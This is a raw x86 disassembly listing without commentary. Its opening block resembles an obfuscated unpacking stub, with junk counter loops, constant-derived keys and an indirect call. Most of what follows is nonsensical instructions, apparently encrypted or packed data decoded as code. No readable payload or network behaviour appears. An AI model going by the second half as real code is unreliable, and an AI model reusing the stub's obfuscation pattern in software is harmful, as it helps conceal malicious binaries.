  40e1e7:	mov    ecx,DWORD PTR ds:0x4335df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43362b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4335af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433617,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433627,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433627
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433627,ecx
  40e244:	cmp    DWORD PTR ds:0x433627,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433627,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433627
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433627,ecx
  40e279:	cmp    DWORD PTR ds:0x433627,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43365b,0x433547
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4335eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4335eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4335eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4335eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433874
  40e2d5:	push   0x433874
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4335eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e322:	adc    esp,edi
  40e324:	lds    esp,FWORD PTR [esp+edi*2+0x7c79a77c]
  40e32b:	jl     0x40e328
  40e32d:	test   BYTE PTR [esi-0x1b3731b6],ah
  40e333:	cmc    
  40e334:	push   es
  40e335:	idiv   BYTE PTR [edx+0x13ee853e]
  40e33b:	lds    ecx,FWORD PTR [esi-0x2e]
  40e33e:	inc    edx
  40e33f:	inc    edi
  40e340:	dec    esi
  40e341:	push   ebx
  40e342:	pusha  
  40e343:	mov    ds:0xe209ea4f,eax
  40e348:	mov    ch,0x99
  40e34a:	and    cl,bl
  40e34c:	sub    ebx,DWORD PTR [ebp-0x72]
  40e34f:	repz inc edi
  40e351:	sbb    ecx,DWORD PTR [ebp-0x2ab513cc]
  40e357:	(bad)  
  40e359:	ret    
  40e35a:	sub    BYTE PTR [eax],ah
  40e35c:	xchg   edi,eax
  40e35d:	and    eax,0xf6556b4b
  40e362:	add    DWORD PTR [eax-0x56dc7637],ecx
  40e368:	mov    BYTE PTR [ecx+0x42cadcf0],dl
  40e36e:	add    eax,0x56e7c603
  40e373:	cmc    
  40e374:	es mov esi,0xe25a2888
  40e37a:	das    
  40e37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e37c:	mov    bh,0x77
  40e37e:	dec    ebp
  40e37f:	lock inc edi
  40e381:	imul   esp
  40e383:	jmp    0x40e38e
  40e385:	jae    0x40e339
  40e387:	stc    
  40e388:	xor    ch,ah
  40e38a:	js     0x40e376
  40e38c:	xor    ebx,DWORD PTR [ecx-0x49d41be]
  40e392:	inc    esi
  40e393:	in     eax,dx
  40e394:	push   cs
  40e395:	loope  0x40e34e
  40e397:	jo     0x40e3c2
  40e399:	inc    edi
  40e39a:	mov    WORD PTR [edi],?
  40e39c:	sbb    ah,BYTE PTR ds:0xfb8a44b5
  40e3a2:	stc    
  40e3a3:	cmp    cl,BYTE PTR [ecx-0x19]
  40e3a6:	mov    bl,bh
  40e3a8:	mov    edx,0x94eac48e
  40e3ad:	outs   dx,DWORD PTR ds:[esi]
  40e3ae:	pop    ss
  40e3af:	imul   ebp,DWORD PTR [edx-0x6b56dba7],0x676934dd
  40e3b9:	dec    edi
  40e3ba:	test   eax,0x3c61feec
  40e3bf:	mov    al,ds:0xa6a3dcfb
  40e3c4:	jp     0x40e3c0
  40e3c6:	(bad)  
  40e3c7:	mov    dl,0x76
  40e3c9:	push   esp
  40e3ca:	clc    
  40e3cb:	mov    edx,ss
  40e3cd:	loop   0x40e354
  40e3cf:	sar    BYTE PTR [ebx],1
  40e3d1:	sbb    ebx,DWORD PTR [ebx+0x33b2a737]
  40e3d7:	sbb    dh,BYTE PTR [ebx+ebx*8]
  40e3da:	push   ecx
  40e3db:	shl    BYTE PTR [esp+eiz*4-0x61],0x62
  40e3e0:	test   dh,al
  40e3e2:	pop    ebp
  40e3e3:	cdq    
  40e3e4:	out    0xca,al
  40e3e6:	iret   
  40e3e7:	fisttp QWORD PTR [eax]
  40e3e9:	shl    DWORD PTR [eax-0x664dbbbb],0xa1
  40e3f0:	cmc    
  40e3f1:	adc    ebx,edx
  40e3f3:	inc    edx
  40e3f4:	fmul   DWORD PTR [ebx+0x57]
  40e3f7:	mov    ds:0xed233395,eax
  40e3fc:	mov    esi,0xbc4ce704
  40e401:	or     al,cl
  40e403:	gs inc ebx
  40e405:	mov    dh,0xa2
  40e407:	test   al,0x8a
  40e409:	ror    DWORD PTR [edx],1
  40e40b:	xor    DWORD PTR [edx-0x1],ebp
  40e40e:	or     BYTE PTR [si],bh
  40e411:	repz ds jmp 0x40e3fd
  40e415:	mov    edi,0xd4f50f00
  40e41a:	ror    DWORD PTR [esi],0xbc
  40e41d:	xchg   ebx,eax
  40e41e:	sub    dh,cl
  40e420:	pop    ds
  40e421:	push   cs
  40e422:	mov    al,0xfe
  40e424:	mov    BYTE PTR [esi-0x511942ee],ch
  40e42a:	pop    DWORD PTR [esi]
  40e42c:	push   ebx
  40e42d:	jnp    0x40e3e6
  40e42f:	xor    ebx,esp
  40e431:	fstp   TBYTE PTR [ebx+0x17]
  40e434:	std    
  40e435:	adc    al,0x34
  40e437:	fwait
  40e438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e439:	jl     0x40e402
  40e43b:	inc    esp
  40e43c:	dec    eax
  40e43d:	mov    eax,0x7d5784af
  40e442:	cmp    DWORD PTR [edx],ecx
  40e444:	lds    ecx,FWORD PTR [ecx]
  40e446:	inc    edx
  40e447:	popf   
  40e448:	mov    edx,0xcb5115b
  40e44d:	jbe    0x40e453
  40e44f:	adc    eax,ecx
  40e451:	sub    BYTE PTR [ebx],0x94
  40e454:	test   DWORD PTR [eax+0x174015ea],edi
  40e45a:	test   eax,0x25ddfd77
  40e45f:	mov    ah,0x72
  40e461:	gs and bh,bl
  40e464:	xor    al,0x9
  40e466:	mov    ebp,0x72e423eb
  40e46b:	add    esi,eax
  40e46d:	aaa    
  40e46e:	add    ch,BYTE PTR [ebp+esi*1-0x114fa8d9]
  40e475:	shl    ecx,0x5a
  40e478:	jp     0x40e434
  40e47a:	mov    ebp,0xdf9bf79f
  40e47f:	out    dx,eax
  40e480:	sahf   
  40e481:	scas   al,BYTE PTR es:[edi]
  40e482:	or     al,0x8d
  40e484:	loopne 0x40e4df
  40e486:	mov    al,0xf7
  40e489:	inc    ebp
  40e48a:	lock xchg eax,esp
  40e48d:	mov    ds:0x5895af8b,al
  40e492:	push   cs
  40e493:	clc    
  40e494:	sub    eax,0xe5852120
  40e499:	in     al,dx
  40e49a:	adc    ecx,DWORD PTR [ebx+0x17016b7f]
  40e4a0:	sbb    DWORD PTR [edx],0x50cec26c
  40e4a6:	adc    eax,0xdd837ae
  40e4ab:	jmp    0x318e:0xaa418c16
  40e4b2:	mov    bl,al
  40e4b4:	movntps XMMWORD PTR [eax+edi*1+0x114ae1d7],xmm0
  40e4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4bd:	mov    ebx,DWORD PTR [esi-0x7cf8d32]
  40e4c3:	inc    edx
  40e4c4:	fsubr  DWORD PTR [ebp-0x7d45373e]
  40e4ca:	sub    BYTE PTR [edi-0x40],al
  40e4cd:	shl    DWORD PTR [ebp+0x5f],cl
  40e4d0:	sub    eax,0x5c67003d
  40e4d5:	call   DWORD PTR [edx]
  40e4d7:	mov    cl,0x7b
  40e4d9:	and    BYTE PTR [ecx-0x1f],0xfb
  40e4dd:	imul   BYTE PTR ds:0x4ec6eed8
  40e4e3:	mov    dl,0x93
  40e4e5:	mov    ?,ebx
  40e4e7:	xchg   DWORD PTR [ebx],ebx
  40e4e9:	setnp  BYTE PTR [esi]
  40e4ec:	stc    
  40e4ed:	sub    DWORD PTR [eax],ebp
  40e4ef:	jbe    0x40e50a
  40e4f1:	pop    ebx
  40e4f2:	dec    ebp
  40e4f3:	shl    DWORD PTR [esi],cl
  40e4f5:	mov    edi,0xefdd091d
  40e4fa:	shr    BYTE PTR [ecx-0xe7566cd],cl
  40e500:	sub    al,0x8c
  40e502:	fsubr  QWORD PTR [ebx]
  40e504:	out    0x8c,eax
  40e506:	jne    0x40e517
  40e508:	pop    es
  40e509:	mov    ebp,0xa15bc48e
  40e50e:	cld    
  40e50f:	mov    al,ds:0x67e9b149
  40e514:	bound  eax,QWORD PTR [edx+0x4d]
  40e517:	clc    
  40e518:	mov    edi,0x12335266
  40e51d:	dec    ebp
  40e51e:	adc    ah,cl
  40e520:	jno    0x40e531
  40e522:	sbb    al,0xf4
  40e524:	xchg   edx,eax
  40e525:	mov    eax,ds:0x2b534cc9
  40e52a:	and    eax,0x31cfe791
  40e52f:	jmp    0x4f0e:0xd1584f69
  40e536:	pop    ebx
  40e537:	arpl   ax,di
  40e539:	aam    0xe6
  40e53b:	xlat   BYTE PTR ds:[ebx]
  40e53c:	jp     0x40e505
  40e53e:	(bad)  
  40e53f:	stc    
  40e540:	jo     0x40e571
  40e542:	cmp    BYTE PTR fs:[eax+0x77],dl
  40e546:	stc    
  40e547:	mov    al,ds:0x550be85b
  40e54c:	add    eax,0x80e3f4d5
  40e551:	inc    ebp
  40e552:	pop    ebx
  40e553:	sub    BYTE PTR ss:[eax],0x7c
  40e557:	std    
  40e558:	push   esi
  40e559:	mov    ebp,0xfcb12713
  40e55e:	iret   
  40e55f:	arpl   WORD PTR [eax+0x47f7174d],dx
  40e565:	sub    esp,DWORD PTR [ebx]
  40e567:	loope  0x40e5ac
  40e569:	adc    bl,BYTE PTR [ebx-0x119acf6a]
  40e56f:	fs jmp 0x9b8b8f68
  40e575:	stos   DWORD PTR es:[edi],eax
  40e576:	inc    ebx
  40e577:	mov    dh,0x44
  40e579:	mov    eax,0x61cd27f6
  40e57e:	mov    bh,0x52
  40e580:	pop    esp
  40e581:	pop    eax
  40e582:	push   ss
  40e583:	xor    eax,0x84f5ccd9
  40e588:	ss stos BYTE PTR es:[edi],al
  40e58a:	inc    esi
  40e58b:	test   DWORD PTR [edx],esi
  40e58d:	fs ret 
  40e58f:	aas    
  40e590:	mov    bl,BYTE PTR ds:0x6410b485
  40e596:	adc    ah,dl
  40e598:	sar    al,cl
  40e59a:	xchg   ebx,eax
  40e59b:	lea    esp,[eax+ebp*4]
  40e59e:	dec    edi
  40e59f:	cmp    eax,0xf096c299
  40e5a4:	ss dec ebp
  40e5a6:	pop    ecx
  40e5a7:	dec    ebp
  40e5a8:	push   esp
  40e5a9:	pop    ebp
  40e5aa:	lea    edx,[esi]
  40e5ac:	outs   dx,BYTE PTR ds:[esi]
  40e5ad:	inc    esi
  40e5ae:	mov    edi,0x5ee245e6
  40e5b3:	imul   ebp,ebp,0x91058070
  40e5b9:	(bad)  
  40e5bb:	jae    0x40e5ce
  40e5bd:	das    
  40e5be:	jmp    0xc81944c7
  40e5c3:	jge    0x40e63e
  40e5c5:	push   0x70
  40e5c7:	push   ds
  40e5c8:	pop    ds
  40e5c9:	test   eax,0x57441109
  40e5ce:	push   ss
  40e5cf:	inc    eax
  40e5d0:	jl     0x40e635
  40e5d2:	jp     0x40e57e
  40e5d4:	mov    cl,0xe
  40e5d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5d7:	inc    esi
  40e5d8:	out    0xac,eax
  40e5da:	xor    DWORD PTR [edx+edi*1+0x515c24b8],edi
  40e5e1:	cld    
  40e5e2:	fistp  DWORD PTR ds:0x384728fd
  40e5e8:	or     al,0xc7
  40e5ea:	push   ss
  40e5eb:	fcomp  DWORD PTR [ebp-0x52]
  40e5ee:	push   edx
  40e5ef:	pop    ss
  40e5f0:	xor    eax,DWORD PTR [esp+ebx*2]
  40e5f3:	rcl    BYTE PTR [edx+0x69],1
  40e5f6:	mov    ebp,0xc4f642d4
  40e5fb:	stos   BYTE PTR es:[edi],al
  40e5fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5fd:	push   ebp
  40e5fe:	jne    0x40e664
  40e600:	dec    ecx
  40e601:	inc    eax
  40e602:	in     al,dx
  40e603:	or     ah,BYTE PTR [eax-0x44]
  40e606:	data16 stc 
  40e608:	add    bh,BYTE PTR [esi-0x3cfa9c2b]
  40e60e:	adc    eax,0xac5aa7aa
  40e613:	fsubr  DWORD PTR [ebx-0x31]
  40e616:	out    0xc8,al
  40e618:	in     al,dx
  40e619:	push   es
  40e61a:	repz (bad) 
  40e61c:	push   ecx
  40e61d:	inc    esi
  40e61e:	jns    0x40e62c
  40e620:	xor    BYTE PTR [edi+ebx*4-0x10],cl
  40e624:	repnz (bad) 
  40e626:	or     eax,0xd13fcee8
  40e62b:	dec    esi
  40e62c:	or     DWORD PTR [ebp+0x12],ebx
  40e62f:	fild   QWORD PTR [edi-0x37ae09f5]
  40e635:	dec    edi
  40e636:	aam    0xf8
  40e638:	ja     0x40e689
  40e63a:	es jmp 0xe45a:0x420c70df
  40e642:	sti    
  40e643:	mov    ch,0x7b
  40e645:	pop    esi
  40e646:	push   0xffffff8c
  40e648:	xor    eax,0xc10f5e87
  40e64d:	cmp    BYTE PTR [edi-0x26914c0f],0xdf
  40e654:	fidiv  DWORD PTR cs:[esi-0x32]
  40e658:	mov    dl,BYTE PTR [ecx-0x45]
  40e65b:	inc    esi
  40e65c:	xor    edi,0xfffffff9
  40e65f:	inc    ebp
  40e660:	jo     0x40e5ed
  40e662:	ins    DWORD PTR es:[edi],dx
  40e663:	pop    ds
  40e664:	call   0x9d11:0x4d07f259
  40e66b:	add    dl,bl
  40e66d:	fist   WORD PTR [edx-0x80]
  40e670:	jmp    0x267c1b06
  40e675:	addr16 mov ds:0xb9f,al
  40e679:	ret    
  40e67a:	mov    eax,ds:0x4a45a950
  40e67f:	inc    eax
  40e680:	cs pop ds
  40e682:	dec    edi
  40e683:	push   ecx
  40e684:	and    DWORD PTR [edi],ebp
  40e686:	nop
  40e687:	out    dx,eax
  40e688:	add    ebx,ebx
  40e68a:	sub    ebx,DWORD PTR ds:0x6676a51c
  40e690:	aam    0xf9
  40e692:	xchg   ebp,eax
  40e693:	mov    ds:0x1a202275,al
  40e698:	mov    ds:0x793b7433,al
  40e69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e69e:	std    
  40e69f:	pop    es
  40e6a0:	je     0x40e6d8
  40e6a2:	push   cs
  40e6a3:	xchg   BYTE PTR [ebx-0x2d],dh
  40e6a6:	cmp    bh,0x8c
  40e6a9:	xor    BYTE PTR [esi],bl
  40e6ab:	or     ecx,eax
  40e6ad:	lahf   
  40e6ae:	mov    ds:0x4d3b75c8,eax
  40e6b3:	ret    0xb888
  40e6b6:	jnp    0x40e6ba
  40e6b8:	push   ds
  40e6b9:	add    BYTE PTR [esi-0x35],cl
  40e6bc:	ret    
  40e6bd:	adc    eax,0x3b3abbb8
  40e6c2:	adc    ecx,DWORD PTR [edi-0x3400845b]
  40e6c8:	inc    esi
  40e6c9:	fld    QWORD PTR [esi]
  40e6cb:	dec    ebx
  40e6cc:	inc    esi
  40e6cd:	ss inc edx
  40e6cf:	jge    0x40e67b
  40e6d1:	and    eax,0x89c2d2c6
  40e6d6:	add    ecx,ebp
  40e6d8:	rol    DWORD PTR [ebx],0x0
  40e6db:	add    BYTE PTR [ebx],cl
  40e6dd:	push   0x67
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e701
  40e6e9:	pop    eax
  40e6ea:	or     ebp,DWORD PTR [esp+ebp*2-0x5883835f]
  40e6f1:	jns    0x40e76f
  40e6f3:	jl     0x40e692
  40e6f5:	out    dx,eax
  40e6f6:	shl    DWORD PTR [ecx-0x4e],cl
  40e6f9:	push   esi
  40e6fa:	nop
  40e6fb:	jmp    0x452e:0x560a34c2
  40e702:	jle    0x40e72b
  40e704:	jno    0x40e71c
  40e706:	lahf   
  40e707:	push   cs
  40e708:	mov    ah,0x3
  40e70a:	mov    DWORD PTR [esi+esi*8+0x77],esp
  40e70e:	push   es
  40e70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e710:	out    0x25,al
  40e712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e713:	cwde   
  40e714:	jae    0x40e6b3
  40e716:	adc    DWORD PTR ds:0x95d8a7ba,ebp
  40e71c:	shr    bl,1
  40e71e:	retf   0x1063
  40e721:	pop    eax
  40e722:	arpl   WORD PTR [ebx-0x599cca3a],ax
  40e728:	sbb    BYTE PTR [edi],0xd3
  40e72b:	dec    ecx
  40e72c:	lea    ecx,[ebp+0x64]
  40e72f:	cmp    eax,0x87541c7d
  40e734:	adc    BYTE PTR [esi-0x3cc52af2],ch
  40e73a:	pusha  
  40e73b:	adc    ch,BYTE PTR [eax]
  40e73d:	sub    eax,edi
  40e73f:	leave  
  40e740:	popa   
  40e741:	(bad)  
  40e742:	fild   DWORD PTR ds:0x1cbdd54e
  40e748:	aaa    
  40e749:	shr    BYTE PTR [esi+0x68],0x52
  40e74d:	test   al,0x2
  40e74f:	adc    dl,dl
  40e751:	gs ret 
  40e753:	ret    0xa9cc
  40e756:	aas    
  40e757:	inc    esi
  40e758:	sbb    DWORD PTR [eax*4+0x665b2778],ecx
  40e75f:	inc    esp
  40e760:	test   BYTE PTR [edx+esi*4],ah
  40e763:	pop    eax
  40e764:	mov    edi,0x9838949b
  40e769:	mov    bh,0x1a
  40e76b:	cmp    al,cl
  40e76d:	call   0xb210fb32
  40e772:	ins    BYTE PTR es:[edi],dx
  40e773:	jmp    0x40e73f
  40e775:	mov    fs:0xd5da4818,eax
  40e77b:	cmp    DWORD PTR [esi],esi
  40e77d:	jno    0x40e762
  40e77f:	sbb    bh,BYTE PTR [ebp-0x60]
  40e782:	pop    edi
  40e783:	int    0x83
  40e785:	add    dh,BYTE PTR [edi-0x2526b9f7]
  40e78b:	or     DWORD PTR [ecx+0x32],ebp
  40e78e:	(bad)  
  40e78f:	jmp    0x40e799
  40e791:	(bad)  
  40e792:	jns    0x40e80c
  40e794:	loopne 0x40e716
  40e796:	push   esi
  40e797:	idiv   DWORD PTR [edi]
  40e799:	jb     0x40e745
  40e79b:	dec    ecx
  40e79c:	xchg   ecx,eax
  40e79d:	cmp    ebp,DWORD PTR [ecx]
  40e79f:	mov    bl,0x4a
  40e7a1:	jo     0x40e79d
  40e7a3:	lods   al,BYTE PTR ds:[esi]
  40e7a4:	pop    esi
  40e7a5:	add    bl,BYTE PTR [eax]
  40e7a7:	push   ecx
  40e7a8:	out    0x24,eax
  40e7aa:	call   0x6fe01d5b
  40e7af:	and    BYTE PTR [edx],bh
  40e7b1:	imul   ecx,DWORD PTR [ebp+0x741f1965],0x1ef04612
  40e7bb:	out    0xcc,eax
  40e7bd:	sbb    edi,ecx
  40e7bf:	out    0x35,al
  40e7c1:	cmovnp eax,DWORD PTR [ebp+ebp*4+0xc]
  40e7c6:	sub    edx,ebx
  40e7c8:	mov    BYTE PTR [esi],bh
  40e7ca:	int3   
  40e7cb:	sar    BYTE PTR [edi-0x42],0x0
  40e7cf:	dec    ecx
  40e7d0:	scas   eax,DWORD PTR es:[edi]
  40e7d1:	(bad)  
  40e7d3:	pop    esi
  40e7d4:	adc    edx,esi
  40e7d6:	and    bh,BYTE PTR [ebx+0xce2506e]
  40e7dc:	mov    al,ds:0xf4c5cf16
  40e7e1:	sbb    ebx,DWORD PTR [eax-0x5e6610f1]
  40e7e7:	stos   BYTE PTR es:[edi],al
  40e7e8:	mov    dh,0xe
  40e7ea:	inc    ebp
  40e7eb:	and    eax,0xaef03b22
  40e7f0:	fist   WORD PTR [esi-0x38684b16]
  40e7f6:	push   cs
  40e7f7:	cld    
  40e7f8:	mov    eax,0x82f639c6
  40e7fd:	imul   ebp,DWORD PTR [eax-0x2d9bd7cf],0x7aa8c335
  40e807:	icebp  
  40e808:	retf   
  40e809:	jo     0x40e828
  40e80b:	int    0xa3
  40e80d:	sbb    eax,0xe7950b5e
  40e812:	mov    al,ds:0x613ca7bb
  40e817:	loopne 0x40e88c
  40e819:	xchg   ebx,eax
  40e81a:	sub    dh,al
  40e81c:	mov    esp,0x8a0fae61
  40e821:	xor    BYTE PTR ds:0x6566f4f5,dl
  40e827:	gs (bad) 
  40e829:	in     al,0xd8
  40e82b:	adc    dl,BYTE PTR [esi]
  40e82d:	mov    ch,0x9f
  40e82f:	aaa    
  40e830:	loopne 0x40e869
  40e832:	or     al,0x68
  40e834:	and    DWORD PTR ds:[edx+0x38c4c7b7],esp
  40e83b:	mov    al,es:0xe659ebaa
  40e841:	imul   ecx,DWORD PTR [ebp+ebx*1-0x4c],0xffffffad
  40e846:	aad    0x1e
  40e848:	inc    edx
  40e849:	(bad)  
  40e84a:	pop    ss
  40e84b:	pop    edi
  40e84c:	cmc    
  40e84d:	outs   dx,BYTE PTR ds:[esi]
  40e84e:	lods   eax,DWORD PTR ds:[esi]
  40e84f:	icebp  
  40e850:	dec    edi
  40e851:	std    
  40e852:	out    dx,al
  40e853:	into   
  40e854:	ins    DWORD PTR es:[edi],dx
  40e855:	test   ah,ah
  40e857:	xor    dl,bl
  40e859:	xor    BYTE PTR ds:0x1b4430e1,cl
  40e85f:	into   
  40e860:	aaa    
  40e861:	adc    DWORD PTR [edi-0x9],edi
  40e864:	pop    esi
  40e865:	popf   
  40e866:	jmp    0x40e824
  40e868:	stos   BYTE PTR es:[edi],al
  40e869:	aaa    
  40e86a:	rol    BYTE PTR [esp+edi*1],1
  40e86d:	test   al,0x95
  40e86f:	lods   al,BYTE PTR ds:[esi]
  40e870:	outs   dx,DWORD PTR ds:[esi]
  40e871:	mov    al,0xae
  40e873:	pop    edi
  40e874:	xchg   ebp,eax
  40e875:	push   ecx
  40e876:	je     0x40e828
  40e878:	inc    ecx
  40e879:	jae    0x40e88a
  40e87b:	pop    ss
  40e87c:	sahf   
  40e87d:	adc    bh,BYTE PTR [ebp+0x43efa8f0]
  40e883:	lods   al,BYTE PTR ds:[esi]
  40e884:	mov    ebx,0x809da41d
  40e889:	jecxz  0x40e8b9
  40e88b:	mov    ah,0x5
  40e88d:	jae    0x40e88c
  40e88f:	jnp    0x40e8ab
  40e891:	mov    ch,0xf2
  40e893:	shl    BYTE PTR [edx],0xbc
  40e896:	push   ebx
  40e897:	inc    esp
  40e898:	call   0xcc199122
  40e89d:	mov    ss,WORD PTR [edx]
  40e89f:	xor    ch,BYTE PTR [ebx-0x3c]
  40e8a2:	ins    DWORD PTR es:[edi],dx
  40e8a3:	inc    ebp
  40e8a4:	loopne 0x40e8d8
  40e8a6:	imul   BYTE PTR [ecx]
  40e8a8:	ja     0x40e8cb
  40e8aa:	or     DWORD PTR [esi+edi*1+0x7b],esi
  40e8ae:	dec    edi
  40e8af:	cwde   
  40e8b0:	adc    dl,BYTE PTR [edx-0x47e1c5c2]
  40e8b6:	jmp    0xd32e7b85
  40e8bb:	and    eax,0xdc751750
  40e8c0:	push   edi
  40e8c1:	aas    
  40e8c2:	stc    
  40e8c3:	jo     0x40e885
  40e8c5:	jbe    0x40e866
  40e8c7:	fstp   DWORD PTR [edi]
  40e8c9:	pushf  
  40e8ca:	xor    DWORD PTR [ebx-0x52],ebp
  40e8cd:	push   ss
  40e8ce:	fiadd  WORD PTR [edi-0x5aabcce7]
  40e8d4:	mov    bh,0xa6
  40e8d6:	xchg   ebx,eax
  40e8d7:	loopne 0x40e887
  40e8d9:	add    bh,BYTE PTR ds:0xd5154fc8
  40e8df:	hlt    
  40e8e0:	hlt    
  40e8e1:	aas    
  40e8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e3:	dec    ebp
  40e8e4:	mov    cl,BYTE PTR [ecx]
  40e8e6:	sbb    dl,ch
  40e8e8:	xchg   ebp,eax
  40e8e9:	sub    DWORD PTR [esi+0x78],ebx
  40e8ec:	jno    0x40e8ab
  40e8ee:	sti    
  40e8ef:	add    edi,DWORD PTR [edx+0x8]
  40e8f2:	sar    BYTE PTR [esi+0x16fe7d07],1
  40e8f8:	fadd   QWORD PTR [eax]
  40e8fa:	add    eax,0x5d8a96ee
  40e8ff:	enter  0xb628,0x17
  40e903:	mov    esp,0x8f888079
  40e908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e909:	dec    eax
  40e90a:	cmp    DWORD PTR [ebx-0x4f042290],ecx
  40e910:	adc    DWORD PTR [edx-0x6a],esp
  40e913:	mov    ebp,0xef2185bd
  40e918:	lock mov ch,0xae
  40e91b:	or     ebp,DWORD PTR [ebp-0x44]
  40e91e:	dec    esp
  40e91f:	or     edx,eax
  40e921:	mov    ecx,0xf6320cd1
  40e926:	jnp    0x40e8ba
  40e928:	ss and dl,0xa9
  40e92c:	xor    DWORD PTR [ebx+0x731fa12a],edi
  40e932:	fadd   QWORD PTR [esi]
  40e934:	pop    edi
  40e935:	(bad)  
  40e936:	cmp    al,0x2b
  40e938:	in     eax,dx
  40e939:	xchg   edi,eax
  40e93a:	mov    ebx,0x67c430ad
  40e93f:	dec    ecx
  40e940:	cmp    eax,0xe5e4c617
  40e945:	stc    
  40e946:	sbb    al,0x86
  40e948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e949:	fdiv   DWORD PTR [edx+0x18]
  40e94c:	int    0x8e
  40e94e:	and    al,0x1f
  40e950:	or     ecx,DWORD PTR [ebp-0x3fd1591b]
  40e956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e957:	leave  
  40e958:	fidiv  DWORD PTR [ebx-0x7c]
  40e95b:	fwait
  40e95c:	int    0x57
  40e95e:	push   esi
  40e95f:	dec    esp
  40e960:	out    dx,al
  40e961:	repz cmp eax,0xfa19e366
  40e967:	imul   esi,DWORD PTR [ebx],0x7c
  40e96a:	dec    esi
  40e96b:	int3   
  40e96c:	dec    ebx
  40e96d:	imul   ebp,DWORD PTR [edi],0x12
  40e970:	or     eax,0x9c534833
  40e975:	ror    ch,cl
  40e977:	ret    0xab00
  40e97a:	adc    DWORD PTR [ecx],esp
  40e97c:	sbb    ah,BYTE PTR [edi]
  40e97e:	jmp    0x697f21e2
  40e983:	dec    esp
  40e984:	mov    ecx,0xc536d966
  40e989:	or     edi,DWORD PTR ds:0x6993bc10
  40e98f:	rcl    ch,1
  40e991:	adc    BYTE PTR [ebp+0xf98ec2d],bl
  40e997:	push   eax
  40e998:	aam    0x72
  40e99a:	call   0x9ec:0x64acde17
  40e9a1:	xor    ebx,esp
  40e9a3:	mov    eax,ds:0xa36b3a3e
  40e9a8:	test   al,0x4f
  40e9aa:	outs   dx,DWORD PTR ds:[esi]
  40e9ab:	(bad)  
  40e9ac:	outs   dx,DWORD PTR ds:[esi]
  40e9ad:	push   ss
  40e9ae:	cmp    ah,ah
  40e9b0:	ret    
  40e9b1:	aaa    
  40e9b2:	xlat   BYTE PTR ds:[ebx]
  40e9b3:	es (bad) 
  40e9b5:	mov    ecx,0x4b5f5d5e
  40e9ba:	sub    DWORD PTR [esi-0x339b196b],0x4e10f296
  40e9c4:	ret    0xf436
  40e9c7:	sub    dh,cl
  40e9c9:	mov    cl,0x6f
  40e9cb:	aas    
  40e9cc:	add    al,0x48
  40e9ce:	add    eax,0x11190c7b
  40e9d3:	shl    BYTE PTR [edx-0x1b],cl
  40e9d6:	cmp    edi,edi
  40e9d8:	jl     0x40ea32
  40e9da:	ins    DWORD PTR es:[edi],dx
  40e9db:	xchg   edx,eax
  40e9dc:	adc    edi,ebx
  40e9de:	jmp    0x7bb8f1e0
  40e9e3:	call   0xcb3b3e51
  40e9e8:	aaa    
  40e9e9:	in     al,dx
  40e9ea:	shl    DWORD PTR [eax-0x4a3178a7],0xac
  40e9f1:	pop    ecx
  40e9f2:	out    dx,eax
  40e9f3:	cmc    
  40e9f4:	into   
